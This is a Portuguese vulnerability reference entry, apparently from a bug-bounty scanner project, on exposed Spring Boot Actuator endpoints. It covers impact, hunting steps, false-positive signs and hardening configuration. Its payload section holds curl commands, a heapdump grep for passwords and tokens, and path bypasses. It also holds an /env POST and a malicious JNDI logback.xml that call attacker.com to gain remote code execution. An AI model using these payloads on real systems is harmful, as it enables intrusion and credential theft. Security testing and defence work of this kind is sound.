---
id: spring_actuator_exposure
title: "Spring Boot Actuator Exposure"
module: "actuator"
severity: "HIGH"
cwe_id: "CWE-200"
cwe_title: "Exposure of Sensitive Information to an Unauthorized Actor"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
vrt_id: "server_security_misconfiguration.sensitive_data_exposure"
---

## Summary
Endpoints do Spring Boot Actuator expostos sem autenticação revelam configurações, variáveis de ambiente, mappings, beans e heap dumps, podendo levar a RCE e roubo de credenciais.

## Description
O Actuator adiciona endpoints operacionais ao Spring Boot. Se `management.endpoints.web.exposure.include=*` ou o endpoint é exposto publicamente sem segurança, um atacante pode acessar:

- `/actuator/env`: propriedades e variáveis de ambiente (muitas vezes com segredos).
- `/actuator/heapdump`: dump da heap JVM, contendo senhas, tokens e chaves.
- `/actuator/mappings`: rotas internas e versões de API.
- `/actuator/beans`: grafo de beans e configurações.
- `/actuator/httptrace`/`httpexchanges`: requisições e headers recentes.
- `/actuator/loggers`: alteração de níveis de log em runtime.
- `/actuator/threaddump`, `/actuator/metrics`, `/actuator/health`.
- `/actuator/jolokia`: ponte JMX que pode levar a RCE.
- `/actuator/gateway/routes`, `/actuator/refresh`, `/actuator/restart`.

Em versões antigas, o `/env` permite sobrescrever propriedades (ex.: `logging.config`) e alcançar RCE. O `/heapdump` é um dos achados mais valiosos em bug bounty porque expõe segredos em texto claro.

## Impact
- Vazamento de credenciais de banco, chaves de API, tokens e segredos de cloud.
- RCE via Jolokia, `/env` ou `/refresh` em configurações vulneráveis.
- Mapeamento interno e descoberta de endpoints administrativos.
- Modificação de configuração em runtime (loggers, rotas, feature flags).
- Impacto HIGH; CRITICAL quando há heapdump com credenciais ou RCE.

## Payloads and Bypasses
```bash
# Descoberta
curl -s https://alvo.com/actuator
curl -s https://alvo.com/actuator/health
curl -s https://alvo.com/actuator/env
curl -s https://alvo.com/actuator/heapdump -o heapdump.hprof
curl -s https://alvo.com/actuator/mappings
curl -s https://alvo.com/actuator/beans
curl -s https://alvo.com/actuator/httptrace
curl -s https://alvo.com/actuator/threaddump

# Caminhos legados (Spring Boot 1.x)
curl -s https://alvo.com/env
curl -s https://alvo.com/heapdump
curl -s https://alvo.com/mappings
curl -s https://alvo.com/beans
curl -s https://alvo.com/trace
curl -s https://alvo.com/dump

# Variações de prefixo / base path
/actuator/
/management/actuator/
/api/actuator/
/internal/actuator/
/actuator;.js

# Jolokia
curl -s https://alvo.com/actuator/jolokia/list
curl -s https://alvo.com/actuator/jolokia/exec/java.lang:type=Runtime/getSystemProperties

# Heap dump: extrair strings
strings heapdump.hprof | grep -iE 'password|secret|token|aws_|jdbc:|api[_-]?key'
```

Exploração de `/env` para RCE (quando sobrescrita habilitada):
```json
POST /actuator/env
Content-Type: application/json
{"name":"logging.config","value":"http://attacker.com/logback.xml"}
```

`logback.xml` malicioso (JNDI):
```xml
<configuration>
  <insertFromJNDI env-entry-name="rmi://attacker.com:1099/Exploit" as="x"/>
</configuration>
```

Bypasses:
```text
- Prefixos alternativos e case: /Actuator, /actuator/
- Extensões: /actuator/env.json, /actuator/env;.js
- Path traversal: /actuator/../actuator/env
- Header X-Forwarded-Prefix: /actuator
- Vhosts internos e portas de management (8081, 9090)
- Acesso via proxy reverso que não bloqueia /actuator
```

Casos reais e mentalidade de ataque (RWBH): em aplicações Spring Boot, o padrão é varrer `/actuator`, baixar `/heapdump` e ler `/env`; o atacante usa os segredos do dump para pivotar para cloud e banco.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `name`, `value` (POST /env); `endpoint`; headers `X-Forwarded-Prefix`.
- **Paths comuns:** `/actuator`, `/actuator/env`, `/actuator/heapdump`, `/actuator/mappings`, `/actuator/beans`, `/actuator/httptrace`, `/actuator/loggers`, `/actuator/threaddump`, `/actuator/jolokia`, `/env`, `/heapdump`, `/mappings`, `/beans`, `/trace`.
- **Sinais:** JSON com `_links`; `whitelabel` error; Spring Boot headers; `management.endpoints.web.exposure.include=*`; heapdump grande.

## Escalation Techniques
Actuator exposto e o ponto de partida para ataques de alto impacto -- o vazamento de informacao leva a comprometimento real:

- **Credenciais do heapdump para acesso a cloud/banco:** `/actuator/heapdump` contem a heap JVM em texto claro. Extrair com `strings heapdump.hprof | grep -iE 'password|secret|token|aws_|jdbc'` revela credenciais de banco de dados, chaves de API, tokens AWS/GCP/Azure. O atacante usa essas credenciais para pivotar para a infraestrutura de cloud.
- **RCE via /env + /refresh:** em configuracoes vulneraveis, `POST /actuator/env` permite sobrescrever propriedades como `logging.config` com URL apontando para `logback.xml` malicioso contendo JNDI injection. Apos `POST /actuator/refresh`, o backend carrega a configuracao remota e executa codigo arbitrario.
- **RCE via Jolokia:** `/actuator/jolokia` expoe operacoes JMX. Atacante pode invocar `Runtime.exec()` ou manipular MBeans para execucao de codigo, criacao de arquivos, ou alteracao de configuracao.
- **Mapeamento interno via /mappings e /beans:** `/actuator/mappings` revela todas as rotas da aplicacao (incluindo endpoints administrativos, APIs internas, debug endpoints). `/actuator/beans` expoe o grafo de dependencias e configuracoes. Essas informacoes permitem ataques direcionados a funcionalidades sensiveis.
- **Roubo de sessoes via /httptrace:** `/actuator/httptrace` (ou `/httpexchanges`) registra requisicoes recentes com headers, incluindo cookies de sessao e tokens de autorizacao de outros usuarios.
- **Modificacao de runtime via /loggers:** atacante pode alterar niveis de log para DEBUG em producao, causando vazamento de dados sensiveis nos logs e potencial DoS por volume de I/O.
- **Encadeamento com SSRF:** conforme o livro Bug Bounty Bootcamp (Cap. 13), SSRF pode ser usada para acessar endpoints Actuator internos que nao sao expostos externamente. Um SSRF para `http://localhost:8080/actuator/env` bypassa qualquer firewall ou ACL de rede.

Conforme a mentalidade de escalacao do livro (Cap. 21 -- Information Disclosure), a informacao vazada pelo Actuator deve sempre ser tratada como ponto de partida para ataques de maior impacto, nao como finding isolado.

## Hunting Methodology
Processo passo a passo para identificar exposicao de Spring Actuator:

1. **Identificar stack Spring Boot:** procurar sinais como pagina de erro `Whitelabel Error Page`, headers `X-Application-Context`, favicon padrao do Spring Boot, ou mensagens de erro com stack traces Java.
2. **Varrer paths do Actuator:** testar `/actuator`, `/actuator/health`, `/actuator/info`, `/actuator/env`, `/actuator/heapdump`, `/actuator/mappings`, `/actuator/beans`, `/actuator/httptrace`, `/actuator/loggers`, `/actuator/jolokia`. Testar tambem paths legados (Spring Boot 1.x): `/env`, `/heapdump`, `/mappings`, `/beans`, `/trace`.
3. **Testar prefixos alternativos:** `/management/actuator/`, `/api/actuator/`, `/internal/actuator/`, `/actuator;.js` (bypass com path parameter). Testar portas alternativas de management (8081, 9090).
4. **Verificar resposta do /actuator:** se retorna JSON com `_links`, listar todos os endpoints disponiveis e testar cada um.
5. **Baixar e analisar heapdump:** se `/actuator/heapdump` esta acessivel, baixar o arquivo e usar `strings`, Eclipse MAT ou VisualVM para buscar credenciais, tokens e chaves.
6. **Analisar /env:** verificar se propriedades sensiveis sao exibidas em texto claro ou mascaradas (`******`). Mesmo mascaradas, os nomes das propriedades revelam a stack tecnologica.
7. **Testar /mappings para superficie de ataque:** mapear todas as rotas internas e endpoints administrativos revelados. Usar essas rotas como entrada para testes subsequentes (IDOR, SQLi, etc.).
8. **Automatizar:** incluir wordlist de paths do Actuator no fuzzer (abordagem do Cap. 25 do livro). Ferramentas como dirsearch, ffuf ou o proprio CrawlerModule do AnarCry devem incluir essas wordlists.

## False Positive Indicators
Sinais de que o Actuator detectado **nao representa risco real**:

- **Apenas /health e /info expostos:** se somente esses dois endpoints respondem e retornam informacao generica (status: UP, versao), o risco e INFO, nao HIGH. Esses endpoints sao comumente expostos de proposito para health checks de load balancers.
- **Autenticacao exigida:** se /actuator/env retorna 401/403 e exige credenciais validas, a exposicao esta protegida por Spring Security. Verificar se nao ha bypass via headers ou paths alternativos antes de descartar.
- **Porta de management separada e nao acessivel:** se o Actuator roda em porta diferente (ex: 8081) vinculada a localhost, e o scanner so acessa a porta publica (8080), os endpoints nao sao acessiveis externamente.
- **Valores mascarados em /env:** se todas as propriedades sensiveis aparecem como `******` (configuracao `show-values: never`), o /env nao vaza credenciais diretamente. Porem, os nomes das propriedades ainda revelam informacao util.
- **Heapdump desabilitado:** se `/actuator/heapdump` retorna 404 ou `"enabled": false`, o endpoint mais critico nao esta acessivel. Reduzir severidade de acordo.
- **Ambiente de staging/desenvolvimento:** se o alvo e claramente ambiente de staging e nao producao (verificar via dominio, dados, configuracao), o impacto real e menor, embora ainda deva ser reportado.
- **Resposta generica sem dados sensiveis:** se /actuator/env retorna apenas propriedades de configuracao inofensivas (server.port, spring.profiles.active) sem credenciais ou tokens, o impacto e reduzido.


## Recommendation
1. Expor apenas endpoints necessários (`health`, `info`) e desabilitar o resto:
```yaml
management:
  endpoints:
    web:
      exposure:
        include: health,info
      base-path: /internal/actuator
  endpoint:
    env:
      show-values: never
    heapdump:
      enabled: false
    jolokia:
      enabled: false
    shutdown:
      enabled: false
```
2. Colocar o Actuator em porta separada, vinculada a localhost/rede interna, com autenticação e mTLS.
3. Proteger com Spring Security e roles administrativas; nunca deixar público.
4. Não expor `env`, `heapdump`, `jolokia`, `threaddump`, `mappings`, `beans`, `httptrace` em produção.
5. Mascarar segredos (`show-values: never`) e usar Secret Manager em vez de variáveis em texto claro.
6. Bloquear `/actuator` no proxy/WAF como defesa em profundidade.
7. Atualizar Spring Boot e dependências; versões antigas têm CVEs de Actuator.
8. Monitorar acessos a `/actuator/*` e downloads de heapdump; alertar imediatamente.
9. Se houver exposição, rotacionar todos os segredos que possam estar no heap/env.

